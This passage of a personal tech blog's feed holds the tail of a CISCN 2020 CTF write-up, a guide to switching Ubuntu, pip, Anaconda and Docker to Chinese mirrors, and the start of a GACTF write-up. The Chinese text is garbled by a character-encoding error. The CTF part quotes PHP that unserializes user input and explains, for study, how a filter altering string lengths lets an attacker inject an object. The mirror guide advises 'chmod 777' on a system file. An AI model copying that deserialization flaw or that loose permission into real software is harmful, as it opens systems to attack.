double-quoted-string">"update_password"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"age"</span> <span class="token operator">=&gt;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"update_age"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"email"</span> <span class="token operator">=&gt;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"update_email"</span><span class="token punctuation">]</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$update_profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>åº”è¯¥æ˜¯è°ƒç”¨<code>User</code>ç±»çš„<code>update</code>æ–¹æ³•æ—¶ç»è¿‡ <code>waf</code> å’Œ <code>unserialize</code> æ—¶å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>å¤§è€é¼ æœ‰è¨€ï¼š</p><blockquote><p>waf() é€ æˆåºåˆ—åŒ–çš„å­—ç¬¦ä¸²é•¿åº¦æ”¹å˜ï¼Œå°±å¯ä»¥æå‰æˆªæ–­äº†</p><p>é€ƒé€¸å‡ºæ¥ä¸€ä¸ªuserå¯¹è±¡å°±è¡Œäº†</p><p><img src="/2020/10/06/CTF_2020CISCN_final/image-20201006032749565.png"></p></blockquote><p>u1s1ï¼ŒPHP æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼Œè¿™é¢˜åé¢å†çœ‹çœ‹æ¥å¤ç°8<em>ï¼ˆå’•å’•å’•</em></p><p><em>ï¼ˆå…ˆæºœäº†å–µ</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¯å¢ƒæ­å»ºä¹‹æ›´æ¢è½¯ä»¶æºæ±‡æ€»(Ubuntu/pip/Anaconda/Dockerç­‰)</title>
      <link href="2020/09/25/Server_ChangeSource/"/>
      <url>2020/09/25/Server_ChangeSource/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå¾ˆå¤šå®˜æ–¹è½¯ä»¶æºé»˜è®¤éƒ½åœ¨å›½å¤–ï¼Œåœ¨å›½å†…ä¸‹è½½ä¸æ˜¯ä¸€èˆ¬çš„æ…¢â€¦â€¦</p><p>äºæ˜¯æˆ‘ä»¬æƒ³åˆ°äº†é€šè¿‡å›½å†…çš„é•œåƒç«™ï¼Œæ¥åŠ é€Ÿè®¿é—®æˆ–ä¸‹è½½ç­‰ã€‚</p><p>æœ€è¿‘æ­å»ºç¯å¢ƒï¼ŒåˆæŠ˜è…¾äº†ä¸€å †æ¢æºï¼Œäºæ˜¯åˆåˆ°å¤„æ‰¾è§‰å¾—æŒºéº»çƒ¦çš„ã€‚</p><p>æ­£å¥½è¿™æ¬¡å°±æ¥æ±‡æ€»ä¸€ä¸‹å„ç§å¸¸ç”¨çš„æ¢æºå¥½äº†ã€‚</p><br><hr><h2 id="ç³»ç»Ÿ-apt-æ¢æº"><a href="#ç³»ç»Ÿ-apt-æ¢æº" class="headerlink" title="ç³»ç»Ÿ apt æ¢æº"></a>ç³»ç»Ÿ apt æ¢æº</h2><p><strong>ä»¥ Ubuntu ä¸ºä¾‹ï¼š</strong></p><p>é¦–å…ˆå¤‡ä»½åŸæ–‡ä»¶</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</code></pre><p>ï¼ˆæœ‰å¯èƒ½éœ€è¦ä¿®æ”¹æ–‡ä»¶æƒé™ä¸ºå¯ç¼–è¾‘ï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">777</span> /etc/apt/sources.list</code></pre><p>è€Œåç¼–è¾‘æ–‡ä»¶</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/apt/sources.list<span class="token comment"># æˆ– sudo gedit /etc/apt/sources.list</span></code></pre><p>éƒ½æ²¡æœ‰çš„è¯å¯ä»¥å…ˆè£…ä¸ªç¼–è¾‘å™¨ï¼Œæˆ–è€… </p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token builtin class-name">echo</span> <span class="token string">"balabala"</span> <span class="token operator">&gt;</span> /etc/apt/sources.list</code></pre><p>å…¶ä¸­çš„ <code>balabala</code> æ˜¯ä¸‹é¢çš„å†…å®¹ã€‚</p><h3 id="æ¸…å-tuna-æº"><a href="#æ¸…å-tuna-æº" class="headerlink" title="æ¸…å tuna æº"></a>æ¸…å tuna æº</h3><blockquote><p>è¯¦è§ <a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a></p><p>æœ¬é•œåƒä»…åŒ…å« 32/64 ä½ x86 æ¶æ„å¤„ç†å™¨çš„è½¯ä»¶åŒ…ï¼Œåœ¨ ARM(arm64, armhf)ã€PowerPC(ppc64el)ã€RISC-V(riscv64) å’Œ S390x ç­‰æ¶æ„çš„è®¾å¤‡ä¸Šï¼ˆå¯¹åº”å®˜æ–¹æºä¸ºports.ubuntu.comï¼‰è¯·ä½¿ç”¨ <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/">ubuntu-ports é•œåƒ</a>ã€‚</p></blockquote><h4 id="Ubuntu-18-04-LTS"><a href="#Ubuntu-18-04-LTS" class="headerlink" title="Ubuntu 18.04 LTS"></a>Ubuntu 18.04 LTS</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><span class="token comment"># é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨</span><span class="token comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span></code></pre><h4 id="Ubuntu-16-04-LTS"><a href="#Ubuntu-16-04-LTS" class="headerlink" title="Ubuntu 16.04 LTS"></a>Ubuntu 16.04 LTS</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span><span class="token comment"># é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨</span><span class="token comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span><span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span></code></pre><h4 id="Ubuntu-20-04-LTS"><a href="#Ubuntu-20-04-LTS" class="headerlink" title="Ubuntu 20.04 LTS"></a>Ubuntu 20.04 LTS</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><span class="token comment"># é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨</span><span class="token comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse </span></code></pre><h4 id="Ubuntu-Ports"><a href="#Ubuntu-Ports" class="headerlink" title="Ubuntu Ports"></a>Ubuntu Ports</h4><blockquote><p>æœ¬é•œåƒä»…åŒ…å« arm64 armhf ppc64el riscv64 s390x æ¶æ„çš„è½¯ä»¶åŒ…ã€‚</p><p>ï¼ˆæ¯”å¦‚åœ¨ NVIDIA Jetson TX2 ç­‰åµŒå…¥å¼ç³»ç»Ÿä¸Šè·‘çš„ï¼‰</p></blockquote><p><strong>Ubuntu 18.04 LTS:</strong> </p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse</span><span class="token comment"># é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨</span><span class="token comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-proposed main restricted universe multiverse</span><span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-proposed main restricted universe multiverse</span></code></pre><p>å…¶ä»–ç‰ˆæœ¬ä¹Ÿç±»ä¼¼ï¼ŒåŠ ä¸ª <code>/ubuntu-ports/</code> å³å¯ã€‚</p><h4 id="Alpine-Linux"><a href="#Alpine-Linux" class="headerlink" title="Alpine Linux"></a>Alpine Linux</h4><p>åœ¨ç»ˆç«¯æ‰§è¡Œä¸‹é¢çš„è¯­å¥ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">'s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g'</span> /etc/apk/repositories</code></pre><h3 id="é˜¿é‡Œæº"><a href="#é˜¿é‡Œæº" class="headerlink" title="é˜¿é‡Œæº"></a>é˜¿é‡Œæº</h3><h4 id="Ubuntu-18-04-LTS-1"><a href="#Ubuntu-18-04-LTS-1" class="headerlink" title="Ubuntu 18.04 LTS"></a>Ubuntu 18.04 LTS</h4><pre class="language-bash" data-language="bash"><code class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</code></pre><h3 id="163æº"><a href="#163æº" class="headerlink" title="163æº"></a>163æº</h3><h4 id="Ubuntu-18-04-LTS-2"><a href="#Ubuntu-18-04-LTS-2" class="headerlink" title="Ubuntu 18.04 LTS"></a>Ubuntu 18.04 LTS</h4><pre class="language-bash" data-language="bash"><code class="language-bash">deb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse</code></pre><hr><p>æ¢å¥½æºåæ›´æ–°æº</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update</code></pre><p>ä¿®å¤æŸåçš„è½¯ä»¶åŒ…ï¼Œå°è¯•å¸è½½å‡ºé”™çš„åŒ…ï¼Œé‡æ–°å®‰è£…æ­£ç¡®ç‰ˆæœ¬çš„ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> -f <span class="token function">install</span></code></pre><p>æ›´æ–°è½¯ä»¶</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade</code></pre><p>æˆ–è€…å®‰è£…è½¯ä»¶â€¦â€¦</p><hr><h2 id="Pypi-pip-æ¢æº"><a href="#Pypi-pip-æ¢æº" class="headerlink" title="Pypi (pip) æ¢æº"></a>Pypi (pip) æ¢æº</h2><h3 id="æ¸…å-tuna-æº-1"><a href="#æ¸…å-tuna-æº-1" class="headerlink" title="æ¸…å tuna æº"></a>æ¸…å tuna æº</h3><p><strong>ä¸´æ—¶å®‰è£…æ—¶ï¼š</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> -i https://pypi.tuna.tsinghua.edu.cn/simple some-package</code></pre><p><code>some-package</code> ä¸ºæ¨¡å—åã€‚</p><p><strong>è®¾ä¸ºé»˜è®¤ï¼š</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> -i https://pypi.tuna.tsinghua.edu.cn/simple pip -Upip config <span class="token builtin class-name">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</code></pre><p><strong>æˆ–è€…</strong>ï¼ŒLinux æˆ– MacOS ä¸‹ä¿®æ”¹ <code>~/.pip/pip.conf </code>ï¼Œè‹¥æ²¡æœ‰æ­¤æ–‡ä»¶åˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> ~/.pip<span class="token builtin class-name">cd</span> ~/.pip<span class="token function">vim</span> pip.conf</code></pre><p>Windows ä¸‹ï¼š</p><blockquote><ol><li>æ–‡ä»¶ç®¡ç†å™¨æ–‡ä»¶è·¯å¾„åœ°å€æ æ•²ï¼š<code>%HOMEPATH%</code> å›è½¦ï¼Œå¿«é€Ÿè¿›å…¥ <code>C:\Users\ç”¨æˆ·å\</code> æ–‡ä»¶å¤¹ä¸­ï¼ˆç”¨æˆ·ç›®å½•ï¼‰</li><li>æ–°å»º <code>pip</code> æ–‡ä»¶å¤¹å¹¶åœ¨æ–‡ä»¶å¤¹ä¸­æ–°å»º <code>pip.ini</code> é…ç½®æ–‡ä»¶</li><li>æ–°å¢ <code>pip.ini</code> é…ç½®æ–‡ä»¶å†…å®¹ </li></ol></blockquote><p>æ–‡ä»¶å†…å®¹å¦‚ä¸‹ã€‚</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token selector">[global]</span><span class="token constant">index-url</span> <span class="token attr-value"><span class="token punctuation">=</span> https://pypi.tuna.tsinghua.edu.cn/simple</span><span class="token selector">[install]</span><span class="token constant">use-mirrors</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span><span class="token constant">mirrors</span> <span class="token attr-value"><span class="token punctuation">=</span> https://pypi.tuna.tsinghua.edu.cn/simple</span><span class="token constant">trusted-host</span> <span class="token attr-value"><span class="token punctuation">=</span> pypi.tuna.tsinghua.edu.cn</span></code></pre><h3 id="å…¶ä»–æº"><a href="#å…¶ä»–æº" class="headerlink" title="å…¶ä»–æº"></a>å…¶ä»–æº</h3><blockquote><ul><li>æ¸…åï¼š<a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></li><li>é˜¿é‡Œäº‘ï¼š<a href="https://mirrors.aliyun.com/pypi/simple">https://mirrors.aliyun.com/pypi/simple</a></li><li>ä¸­å›½ç§‘æŠ€å¤§å­¦ <a href="https://pypi.mirrors.ustc.edu.cn/simple">https://pypi.mirrors.ustc.edu.cn/simple</a></li><li>è±†ç“£ï¼š<a href="https://pypi.douban.com/simple/">https://pypi.douban.com/simple/</a></li></ul></blockquote><hr><h2 id="Anaconda-æ¢æº"><a href="#Anaconda-æ¢æº" class="headerlink" title="Anaconda æ¢æº"></a>Anaconda æ¢æº</h2><blockquote><p>å‚è€ƒ <a href="https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/">https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/</a></p></blockquote><p>Anaconda å®‰è£…åŒ…å¯ä»¥åˆ° <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/</a> ä¸‹è½½ã€‚</p><p>TUNA è¿˜æä¾›äº† Anaconda ä»“åº“ä¸ç¬¬ä¸‰æ–¹æºï¼ˆconda-forgeã€msys2ã€pytorchç­‰ï¼Œ<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/">æŸ¥çœ‹å®Œæ•´åˆ—è¡¨</a>ï¼‰çš„é•œåƒï¼Œå„ç³»ç»Ÿéƒ½å¯ä»¥é€šè¿‡ä¿®æ”¹ç”¨æˆ·ç›®å½•ä¸‹çš„ <code>.condarc</code> æ–‡ä»¶ã€‚Windows ç”¨æˆ·æ— æ³•ç›´æ¥åˆ›å»ºåä¸º <code>.condarc</code> çš„æ–‡ä»¶ï¼Œå¯å…ˆæ‰§è¡Œ <code>conda config --set show_channel_urls yes</code> ç”Ÿæˆè¯¥æ–‡ä»¶ä¹‹åå†ä¿®æ”¹ã€‚</p><pre class="language-none"><code class="language-none">channels:  - defaultsshow_channel_urls: truechannel_alias: https://mirrors.tuna.tsinghua.edu.cn/anacondadefault_channels:  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/pro  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2custom_channels:  conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud  simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</code></pre><p>å³å¯æ·»åŠ  Anaconda Python å…è´¹ä»“åº“ã€‚</p><p>è¿è¡Œ <code>conda clean -i</code> æ¸…é™¤ç´¢å¼•ç¼“å­˜ï¼Œä¿è¯ç”¨çš„æ˜¯é•œåƒç«™æä¾›çš„ç´¢å¼•ã€‚</p><p>è¿è¡Œ <code>conda create -n myenv numpy</code> æµ‹è¯•ä¸€ä¸‹å§ã€‚</p><p><strong>æˆ–è€…</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/<span class="token comment"># è®¾ç½®æœç´¢æ—¶æ˜¾ç¤ºé€šé“åœ°å€</span>conda config --set show_channel_urls <span class="token function">yes</span></code></pre><p>conda é¢å¤–åº“ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># pytorch</span>conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/<span class="token comment"># å®‰è£…æ—¶PyTorchï¼Œå®˜ç½‘ç»™çš„å®‰è£…å‘½ä»¤éœ€è¦å»æ‰æœ€åçš„-c pytorchï¼Œæ‰èƒ½ä½¿ç”¨æ¸…åæº</span><span class="token comment"># conda-forge</span>conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/<span class="token comment"># msys2</span>conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/<span class="token comment"># bioconda</span>conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/bioconda/<span class="token comment"># menpo</span>conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/menpo/<span class="token comment"># è®¾ç½®æœç´¢æ—¶æ˜¾ç¤ºé€šé“åœ°å€</span>conda config --set show_channel_urls <span class="token function">yes</span></code></pre><hr><h2 id="Docker-æ¢æº"><a href="#Docker-æ¢æº" class="headerlink" title="Docker æ¢æº"></a>Docker æ¢æº</h2><blockquote><p>å‚è€ƒä¹‹å‰å†™çš„ <a href="https://miaotony.xyz/2020/02/02/Server_Docker/#%E6%8D%A2%E6%BA%90">Docker å®‰è£…åŠå¸¸ç”¨å‘½ä»¤</a>ã€‚</p></blockquote><h3 id="ç¼–è¾‘æ–‡ä»¶"><a href="#ç¼–è¾‘æ–‡ä»¶" class="headerlink" title="ç¼–è¾‘æ–‡ä»¶"></a>ç¼–è¾‘æ–‡ä»¶</h3><p>Linux ä¸‹ï¼Œç¼–è¾‘æ­¤æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰åˆ™æ–°å»ºã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/docker/daemon.json</code></pre><p>Windows ä¸‹æ–‡ä»¶ä¸º</p><pre class="language-none"><code class="language-none">%programdata%\docker\config\daemon.json</code></pre><p>å†…å®¹å¯ä»¥ä¸ºå¤šä¸ªé•œåƒ</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">,</span>    <span class="token string">"https://dockerhub.azk8s.cn/"</span><span class="token punctuation">,</span>    <span class="token string">"http://hub-mirror.c.163.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="é…ç½®å®Œä¹‹åé‡å¯æœåŠ¡"><a href="#é…ç½®å®Œä¹‹åé‡å¯æœåŠ¡" class="headerlink" title="é…ç½®å®Œä¹‹åé‡å¯æœåŠ¡"></a>é…ç½®å®Œä¹‹åé‡å¯æœåŠ¡</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart docker</code></pre><h3 id="æ£€æŸ¥æ˜¯å¦ç”Ÿæ•ˆ"><a href="#æ£€æŸ¥æ˜¯å¦ç”Ÿæ•ˆ" class="headerlink" title="æ£€æŸ¥æ˜¯å¦ç”Ÿæ•ˆ"></a>æ£€æŸ¥æ˜¯å¦ç”Ÿæ•ˆ</h3><pre class="language-bash" data-language="bash"><code class="language-bash">docker info</code></pre><p>çœ‹æœ€åçš„ Registry Mirrors é‡Œæœ‰æ²¡æœ‰æ·»åŠ æˆåŠŸã€‚</p><hr><p>å¤§æ¦‚å°±å…ˆæ”¶é›†è¿™ä¹ˆå¤šå§ï¼ˆ</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Configuration </tag>
            
            <tag> æ¢æº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 GACTF ä¸€ç‚¹ç‚¹WriteUp</title>
      <link href="2020/08/31/CTF_2020GACTF/"/>
      <url>2020/08/31/CTF_2020GACTF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/08/31/CTF_2020GACTF/d7499bfe36874a5aaa7c76c413991efb.jpg"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>è¿™å‡ å¤©æœ‰ä¸ª GACTFï¼Œæœ¬æ¥è¿™å‡ å¤©æœ‰ç‚¹äº‹æƒ…æ²¡æ‰“ç®—æ¥çœ‹çš„ï¼Œç»“æœé˜Ÿé‡Œå¸ˆå‚…çªç„¶æ‰”æ¥ä¸ªä»£ç ï¼Œè¿˜ä»¥ä¸ºæ˜¯å¸® debugï¼Œåæ¥æ‰å‘ç°æ˜¯ä¸ª CTF é¢˜ç›®ã€‚ã€‚<em>ï¼ˆåè€¶</em></p><p>äºæ˜¯éšæ„æ¥çœ‹çœ‹é¢˜ç›®äº†ï¼Œå°±ä½›ç³»åšäº†å‡ ä¸ªé¢˜å˜¤å˜¤å˜¤ï¼Œé¡ºä¾¿æ¥å­¦ç‚¹ä¸œè¥¿å°±æ˜¯äº†ã€‚</p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="crymisc"><a href="#crymisc" class="headerlink" title="crymisc"></a>crymisc</h3><blockquote><p>8.25 is Chinese Valentineâ€™s Day.Yesterday my brother told me he was  refused by a beautiful girl.He was sooooooooooooo sad and bursted into  tears.<br>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1EZzhnAa5Q4OD8y-YEAcjzQ">https://pan.baidu.com/s/1EZzhnAa5Q4OD8y-YEAcjzQ</a><br>æå–ç ï¼š866h<br><a href="https://drive.google.com/drive/folders/1gDfMBrtqwvi7f9BaB1ixjogeLDascjED?usp=sharing">https://drive.google.com/drive/folders/1gDfMBrtqwvi7f9BaB1ixjogeLDascjED?usp=sharing</a></p></blockquote><p>ä¸‹è½½ä¸‹æ¥ä¸€ä¸ª <code>crymisc.docx</code>ï¼Œä¸€çœ‹æ‰“ä¸å¼€æœç„¶æ”¹æˆ 